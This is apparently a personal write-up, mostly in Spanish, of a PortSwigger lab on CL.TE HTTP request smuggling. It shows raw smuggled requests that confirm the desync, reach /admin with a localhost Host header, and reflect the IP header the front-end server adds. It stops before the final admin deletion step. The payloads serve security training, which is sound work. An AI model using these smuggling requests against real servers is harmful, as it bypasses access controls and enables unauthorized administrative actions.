# Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

There's an admin panel at `/admin`, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the `X-Forwarded-For` header but has a different name.

To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user `carlos`.

Confirmamos que prioriza content-length porque esto da timeout:
~~~
POST / HTTP/1.1\r\n
Host: Portsqiger-lab\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
3\r\n
abc\r\n
X\r\n
~~~
Así que vamos a confirmar que es un CL.TE causando un 404, le damos a update contat-lengh, en caso de que este desactivada, porque queremos que el content-length siempre incluya toda la request
```
POST / HTTP/1.1
Host: 0a25002504c5f913809699810070003a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0

GET /qwerty HTTP/1.1
Content-Length: 3
Host: localhost

x=
```
Luego de la x no hay nada, el content-length es 3 porque incluya un espacio en el que se concatenará la siguiente request, normal.
Si mandamos la request
```
POST / HTTP/1.1
Host: 0a25002504c5f913809699810070003a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 66
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Content-Length: 3
Host: localhost

x=
```
Obtenemos un "401 unathorized" Pero como dice la descripción, el front-end esta redescribiendo lo que buscamos, le esta agregando una cabecera para que no lo engañemos.
Poniendome a buscar un poco encontré un input en donde busca en base a un valor que le demos:
~~~
POST / HTTP/2
Host: 0a25002504c5f913809699810070003a.web-security-academy.net
Cookie: session=yCmJVE8MXXg3aBdJZrRq8jh4BDiOSngG
Content-Length: 10

search=asd
~~~
Así que concatenando una request con esta,
~~~
POST / HTTP/1.1
Host: 0a25002504c5f913809699810070003a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Content-Length: 159
Content-Type: application/x-www-form-urlencoded

search=
~~~
Le damos un content length largo, que incluya toda la siguiente petición y se realizará la búsqueda con la request, mostrandonos como el frontend la rescribe